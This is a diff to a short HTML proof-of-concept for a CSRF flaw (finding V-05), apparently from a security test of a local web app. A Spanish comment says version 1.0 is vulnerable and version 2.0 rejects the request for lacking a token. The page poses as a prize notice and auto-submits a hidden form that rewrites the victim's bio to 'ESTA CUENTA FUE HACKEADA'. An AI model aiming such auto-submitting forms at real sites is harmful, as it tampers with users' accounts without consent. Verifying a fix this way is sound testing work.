@@ -1,8 +1,10 @@
+<!-- PoC CSRF (V-05). Contra la v1.0 cambia la biografía de la víctima;
+     contra la v2.0 el servidor responde 400 porque falta el token CSRF. -->
 <html>
   <body>
     <h1>¡Has ganado un premio!</h1>
-    <form id="csrf-form" action="http://127.0.0.1:5000/update_bio" method="POST">
-      <input type="hidden" name="new_bio" value="ESTA CUENTA FUE HACKEADA" />
+    <form id="csrf-form" action="http://localhost:5000/update_bio" method="POST">
+      <input type="hidden" name="nueva_bio" value="ESTA CUENTA FUE HACKEADA" />
     </form>
     <script>document.getElementById('csrf-form').submit();</script>
   </body>
